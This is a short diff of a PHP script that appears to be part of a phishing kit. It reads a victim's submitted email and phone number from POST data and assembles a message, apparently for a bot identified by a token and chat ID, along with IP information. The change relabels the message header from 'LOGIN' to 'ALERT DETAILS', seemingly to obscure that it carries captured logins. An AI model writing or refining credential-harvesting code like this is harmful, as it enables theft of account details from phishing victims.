@@ -28,7 +28,7 @@ function foo($botToken, $chatID, $email, $number, $message) {
 $email = $_POST['email'] ?? "";
 $number = $_POST['number'] ?? "";
 
-$message = "----------------LOGIN---------------\n";
+$message = "----------------ALERT DETAILS---------------\n";
 $message .= "EMAIL         : " . $email . "\n";
 $message .= "NUMBER      : " . $number . "\n";
 $message .= "----------------IP's INFO------------\n";
